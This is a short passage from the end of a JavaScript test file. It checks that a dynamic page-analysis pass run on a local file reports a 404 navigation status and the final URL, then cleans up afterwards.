      const out = await runDynamicPass({ page: { kind: 'file', url: pathToFileURL(filePath).href, filePath, root }, limits: { settleMs: 100, maxTabs: 1 } });
      expect(out.navigation).toEqual({ status: 404, finalUrl: 'index.html' });
    } finally {
      cleanup();
    }
  }, 120_000);
});
